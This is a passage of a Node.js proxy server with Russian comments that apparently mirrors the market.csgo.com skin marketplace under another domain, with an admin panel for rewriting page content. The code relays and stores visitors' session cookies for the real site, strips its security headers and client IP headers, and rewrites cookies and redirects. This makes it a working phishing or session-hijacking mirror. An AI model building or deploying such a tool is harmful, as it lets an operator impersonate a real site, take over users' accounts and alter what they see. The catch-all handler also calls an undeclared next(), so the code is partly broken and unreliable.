                                <i class="bi bi-eye"></i>
                            </button>
                            <button class="btn btn-sm btn-warning edit-btn" data-url="\${item.url}">
                                <i class="bi bi-pencil"></i>
                            </button>
                            <button class="btn btn-sm btn-danger delete-btn" data-url="\${item.url}">
                                <i class="bi bi-trash"></i>
                            </button>
                        </div>
                    \`;
                    
                    // Добавляем обработчики событий для кнопок
                    const viewBtn = listItem.querySelector('.view-btn');
                    const editBtn = listItem.querySelector('.edit-btn');
                    const deleteBtn = listItem.querySelector('.delete-btn');
                    
                    viewBtn.addEventListener('click', () => showDetails(item.url));
                    editBtn.addEventListener('click', () => editItem(item.url));
                    deleteBtn.addEventListener('click', () => showDeleteConfirmation(item.url));
                    
                    customPagesListEl.appendChild(listItem);
                });
            }
            
            // Показать подробную информацию о модификации
            function showDetails(url) {
                const item = customPagesList.find(item => item.url === url);
                if (!item) return;
                
                document.getElementById('detailUrl').textContent = item.url;
                document.getElementById('detailSelector').textContent = item.selector;
                document.getElementById('detailValue').textContent = item.value;
                document.getElementById('detailTimestamp').textContent = formatDate(item.timestamp);
                
                const viewPageBtn = document.getElementById('viewPageBtn');
                viewPageBtn.href = item.url;
                
                const editItemBtn = document.getElementById('editItemBtn');
                editItemBtn.onclick = () => {
                    detailsModal.hide();
                    editItem(item.url);
                };
                
                detailsModal.show();
            }
            
            // Редактирование существующей модификации
            function editItem(url) {
                const item = customPagesList.find(item => item.url === url);
                if (!item) return;
                
                pageUrlInput.value = item.url;
                cssSelectorInput.value = item.selector;
                customValueInput.value = item.value;
                
                // Прокручиваем к форме
                form.scrollIntoView({ behavior: 'smooth' });
            }
            
            // Показать модальное окно подтверждения удаления
            function showDeleteConfirmation(url) {
                deleteUrl = url;
                document.getElementById('deleteModalUrl').textContent = url;
                deleteModal.show();
            }
            
            // Удаление модификации
            async function deleteCustomPage() {
                if (!deleteUrl) return;
                
                try {
                    const response = await fetch('/admin-api/delete-custom-page', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ url: deleteUrl })
                    });
                    
                    if (!response.ok) {
                        const errorData = await response.json();
                        throw new Error(errorData.error || 'Ошибка при удалении');
                    }
                    
                    showToast('Настройки успешно удалены');
                    await loadCustomPages();
                } catch (error) {
                    console.error('Ошибка удаления:', error);
                    showToast('Ошибка при удалении: ' + error.message, 'danger');
                } finally {
                    deleteModal.hide();
                    deleteUrl = '';
                }
            }
            
            // Сохранение формы
            async function saveCustomPage(e) {
                e.preventDefault();
                
                const url = pageUrlInput.value.trim();
                const selector = cssSelectorInput.value.trim();
                const value = customValueInput.value;
                
                if (!url || !selector || value === undefined) {
                    showToast('Пожалуйста, заполните все поля', 'danger');
                    return;
                }
                
                try {
                    const response = await fetch('/admin-api/save-custom-page', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ url, selector, value })
                    });
                    
                    if (!response.ok) {
                        const errorData = await response.json();
                        throw new Error(errorData.error || 'Ошибка при сохранении');
                    }
                    
                    showToast('Настройки успешно сохранены');
                    await loadCustomPages();
                    
                    // Очищаем форму
                    form.reset();
                } catch (error) {
                    console.error('Ошибка сохранения:', error);
                    showToast('Ошибка при сохранении: ' + error.message, 'danger');
                }
            }
            
            // Проверка селектора
            function testSelector() {
                const url = pageUrlInput.value.trim();
                const selector = cssSelectorInput.value.trim();
                
                if (!url || !selector) {
                    showToast('Пожалуйста, введите URL и селектор', 'warning');
                    return;
                }
                
                // Открываем новое окно с нужной страницей
                const testWindow = window.open(url, '_blank');
                
                // Добавляем скрипт для проверки селектора
                setTimeout(() => {
                    try {
                        testWindow.postMessage({
                            type: 'testSelector',
                            selector: selector
                        }, '*');
                    } catch (e) {
                        showToast('Не удалось проверить селектор', 'danger');
                    }
                }, 2000);
            }
            
            // Сброс всех модификаций
            async function resetAllCustomPages() {
                try {
                    const response = await fetch('/admin-api/reset-all-custom-pages', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({})
                    });
                    
                    if (!response.ok) {
                        const errorData = await response.json();
                        throw new Error(errorData.error || 'Ошибка при сбросе всех модификаций');
                    }
                    
                    showToast('Все модификации успешно сброшены', 'success');
                    await loadCustomPages();
                } catch (error) {
                    console.error('Ошибка сброса:', error);
                    showToast('Ошибка при сбросе модификаций: ' + error.message, 'danger');
                } finally {
                    resetAllModal.hide();
                }
            }
            
            // Инициализация
            document.addEventListener('DOMContentLoaded', () => {
                // Загружаем список модифицированных страниц
                loadCustomPages();
                
                // Обработчики событий
                form.addEventListener('submit', saveCustomPage);
                confirmDeleteBtn.addEventListener('click', deleteCustomPage);
                confirmResetAllBtn.addEventListener('click', resetAllCustomPages);
                resetAllBtn.addEventListener('click', () => resetAllModal.show());
                testButton.addEventListener('click', testSelector);
                
                // Добавляем обработчик сообщений от тестового окна
                window.addEventListener('message', (event) => {
                    if (event.data && event.data.type === 'selectorTestResult') {
                        if (event.data.found) {
                            showToast(\`Найдено \${event.data.count} элемент(ов) по селектору\`, 'success');
                        } else {
                            showToast('Элементы по указанному селектору не найдены', 'warning');
                        }
                    }
                });
            });
        </script>
    </body>
    </html>
    `;
    
    res.send(html);
});

// Улучшенная обработка GraphQL запросов
app.post('/api/graphql', async (req, res, next) => {
    try {
        const targetUrl = TARGET_HOST + '/api/graphql';
        const baseUrl = getBaseUrl(req);
        const sessionId = req.cookies.sessionId || Math.random().toString(36).substring(7);
        const session = getSession(sessionId);
        
        // Собираем cookies для запроса
        const requestCookies = new Map([
            ...session.cookies,
            ...parseCookieHeader(req.headers.cookie)
        ]);
        
        console.log(`📊 GraphQL: ${req.method} ${req.originalUrl}`);
        
        // Специальные настройки для GraphQL
        const axiosConfig = {
            method: req.method,
            url: targetUrl,
            headers: {
                ...req.headers,
                'host': 'market.csgo.com',
                'origin': 'https://market.csgo.com',
                'referer': 'https://market.csgo.com/',
                'content-type': 'application/json',
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': req.headers['user-agent'] || 'Mozilla/5.0',
                'cookie': createCookieString(requestCookies)
            },
            data: req.body,
            responseType: 'json',
            validateStatus: () => true,
            maxRedirects: 0,
            timeout: 30000,
            httpsAgent: httpsAgent
        };
        
        // Удаляем заголовки прокси
        delete axiosConfig.headers['x-forwarded-for'];
        delete axiosConfig.headers['x-forwarded-proto'];
        delete axiosConfig.headers['x-forwarded-host'];
        
        const response = await axios(axiosConfig);
        
        // Сохраняем cookies из ответа
        if (response.headers['set-cookie']) {
            const newCookies = parseSetCookieHeaders(response.headers['set-cookie']);
            newCookies.forEach((value, name) => {
                session.cookies.set(name, value);
            });
        }
        
        // Устанавливаем sessionId cookie если её нет
        if (!req.cookies.sessionId) {
            res.cookie('sessionId', sessionId, { 
                httpOnly: true, 
                secure: isSecure(req),
                sameSite: isSecure(req) ? 'none' : 'lax'
            });
        }
        
        // Устанавливаем заголовки
        Object.entries(response.headers).forEach(([key, value]) => {
            if (!['content-encoding', 'content-length', 'transfer-encoding'].includes(key.toLowerCase())) {
                res.set(key, value);
            }
        });
        
        // Проверяем наличие ошибок в GraphQL ответе
        if (response.data && response.data.errors) {
            console.warn('GraphQL responded with errors:', JSON.stringify(response.data.errors));
        }
        
        res.status(response.status);
        res.json(response.data);
        
    } catch (error) {
        console.error('❌ GraphQL error:', error.message);
        // Пытаемся вернуть хоть какой-то ответ, чтобы клиент не зависал
        res.status(500).json({ 
            errors: [{ message: 'Proxy GraphQL Error: ' + error.message }],
            data: null
        });
    }
});

// Главный обработчик HTTP запросов
app.use('*', async (req, res) => {
    try {
        // Пропускаем запросы к админке и API
        if (req.originalUrl.startsWith('/adminka') || req.originalUrl.startsWith('/admin-api')) {
            return next();
        }
        
        const baseUrl = getBaseUrl(req);
        const targetUrl = TARGET_HOST + req.originalUrl;
        const sessionId = req.cookies.sessionId || Math.random().toString(36).substring(7);
        const session = getSession(sessionId);
        
        // Устанавливаем sessionId если его нет
        if (!req.cookies.sessionId) {
            res.cookie('sessionId', sessionId, { 
                httpOnly: true, 
                secure: isSecure(req),
                sameSite: isSecure(req) ? 'none' : 'lax'
            });
        }
        
        // Собираем cookies для запроса
        const requestCookies = new Map([
            ...session.cookies,
            ...parseCookieHeader(req.headers.cookie)
        ]);
        
        console.log(`🌐 ${req.method} ${req.originalUrl} (${isSecure(req) ? 'HTTPS' : 'HTTP'})`);
        
        // Улучшены настройки для axios
        const axiosConfig = {
            method: req.method,
            url: targetUrl,
            headers: {
                ...req.headers,
                'host': 'market.csgo.com',
                'origin': 'https://market.csgo.com',
                'referer': 'https://market.csgo.com/',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': req.headers['user-agent'] || 'Mozilla/5.0',
                'cookie': createCookieString(requestCookies)
            },
            data: req.body,
            responseType: 'arraybuffer',
            validateStatus: () => true,
            maxRedirects: 0,
            decompress: true,
            httpsAgent: httpsAgent,
            timeout: 30000
        };
        
        // Удаляем заголовки прокси
        delete axiosConfig.headers['x-forwarded-for'];
        delete axiosConfig.headers['x-forwarded-proto'];
        delete axiosConfig.headers['x-forwarded-host'];
        delete axiosConfig.headers['x-real-ip'];
        delete axiosConfig.headers['cf-connecting-ip'];
        delete axiosConfig.headers['cf-ipcountry'];
        
        const response = await axios(axiosConfig);
        
        // Обработка редиректов
        if ([301, 302, 303, 307, 308].includes(response.status)) {
            let location = response.headers.location;
            if (location) {
                if (location.includes('market.csgo.com')) {
                    location = location.replace(/https?:\/\/market\.csgo\.com/, baseUrl);
                } else if (location.startsWith('/')) {
                    location = baseUrl + location;
                }
                console.log(`↪️ Redirect: ${location}`);
                return res.redirect(response.status, location);
            }
        }
        
        // Сохраняем cookies из ответа
        if (response.headers['set-cookie']) {
            const newCookies = parseSetCookieHeaders(response.headers['set-cookie']);
            newCookies.forEach((value, name) => {
                session.cookies.set(name, value);
            });
        }
        
        // Модификация контента
        let content = response.data;
        const contentType = response.headers['content-type'] || '';
        
        if (contentType.includes('text/') || 
            contentType.includes('application/javascript') || 
            contentType.includes('application/json') ||
            contentType.includes('application/xml')) {
            content = Buffer.from(modifyUrls(content.toString('utf8'), baseUrl, contentType), 'utf8');
        }
        
        // Подготовка заголовков ответа
        const responseHeaders = { ...response.headers };
        
        // Удаляем небезопасные заголовки
        delete responseHeaders['content-security-policy'];
        delete responseHeaders['x-frame-options'];
        delete responseHeaders['x-content-type-options'];
        delete responseHeaders['strict-transport-security'];
        delete responseHeaders['permissions-policy'];
        delete responseHeaders['cross-origin-opener-policy'];
        delete responseHeaders['cross-origin-embedder-policy'];
        
        // Добавляем заголовки безопасности для HTTPS
        if (isSecure(req)) {
            responseHeaders['content-security-policy'] = "upgrade-insecure-requests";
        }
        
        // Модификация set-cookie
        if (responseHeaders['set-cookie']) {
            responseHeaders['set-cookie'] = responseHeaders['set-cookie'].map(cookie => {
                return cookie
                    .replace(/domain=.*?(;|$)/gi, '')
                    .replace(/secure;/gi, isSecure(req) ? 'secure;' : '')
                    .replace(/samesite=none/gi, isSecure(req) ? 'samesite=none' : 'samesite=lax');
            });
        }
        
        // Устанавливаем заголовки
        Object.entries(responseHeaders).forEach(([key, value]) => {
            if (key.toLowerCase() !== 'content-encoding' && key.toLowerCase() !== 'content-length') {
                res.set(key, value);
            }
        });
        
        res.set('content-length', content.length);
        res.status(response.status);
        res.send(content);
        
    } catch (error) {
        console.error('❌ Proxy error:', error.message);
        res.status(500).json({ 
            error: 'Proxy Error', 
            message: error.message,
            stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
        });
    }
});

// Добавлена периодическая очистка устаревших сессий
setInterval(() => {
    const now = Date.now();
    let cleaned = 0;
    
    sessions.forEach((session, id) => {
        if (session.lastAccess && now - session.lastAccess > 24 * 60 * 60 * 1000) { // Старше 24 часов
            sessions.delete(id);
            cleaned++;
        }
    });
    
    if (cleaned > 0) {
        console.log(`🧹 Cleaned ${cleaned} expired sessions`);
    }
}, 60 * 60 * 1000); // Проверка каждый час

// Запуск сервера
server.listen(PORT, '0.0.0.0', () => {
    console.log(`
    🚀 Advanced Market Proxy Server (IMPROVED VERSION WITH ADMIN PANEL)
    📡 Port: ${PORT}
    🎯 Target: ${TARGET_HOST}
    🔌 WebSocket: ${WS_TARGET}
    🔒 HTTPS: Auto-detected
    👨‍💼 Admin Panel: ${isSecure({ headers: {} }) ? 'https' : 'http'}://localhost:${PORT}/adminka
    
    Features:
    ✓ Full HTTP/HTTPS proxy
    ✓ WebSocket support (Fixed)
    ✓ GraphQL support (Enhanced)
    ✓ Cookie management
    ✓ CORS handling
    ✓ URL rewriting (Improved)
    ✓ Content modification
    ✓ Mixed content prevention
    ✓ AdBlocker bypass attempt
    ✓ Admin Panel for custom page modifications
    `);
});

// Graceful shutdown
process.on('SIGINT', () => {
    console.log('\n🔄 Shutting down gracefully...');
    // Сохраняем настройки перед выключением
    saveCustomPages();
    server.close(() => {
        console.log('✅ Server closed');
        process.exit(0);
    });
});
